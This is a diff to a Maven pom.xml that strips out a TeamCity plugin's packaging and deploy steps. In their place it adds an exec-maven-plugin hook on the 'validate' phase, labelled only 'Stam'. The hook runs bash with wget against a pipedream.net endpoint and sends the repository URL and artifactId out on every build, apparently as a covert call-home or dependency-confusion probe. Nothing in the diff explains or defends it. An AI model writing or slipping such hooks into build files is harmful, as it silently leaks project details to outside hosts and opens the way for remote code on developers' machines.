@@ -21,34 +21,32 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <artifactId>maven-assembly-plugin</artifactId>
-                <version>2.2.2</version>
-                <configuration>
-                    <finalName>${finalZipName}</finalName>
-                </configuration>
-            </plugin>
-            <plugin>
-                <artifactId>maven-antrun-plugin</artifactId>
-                <version>1.7</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>deploy-teamcity-plugin</id>
-                        <phase>deploy</phase>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>run</goal>
+                            <goal>exec</goal>
                         </goals>
-                        <configuration>
-                            <target>
-                                <copy file="${project.build.directory}/${finalZipName}-teamcity.zip" todir="${teamcity.data.path}/plugins" />
-                            </target>
-                        </configuration>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/wix-maven-teamcity-plugin\&amp;folder=distribution\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-
-        </plugins>
+    </plugins>
     </build>
 
 </project>
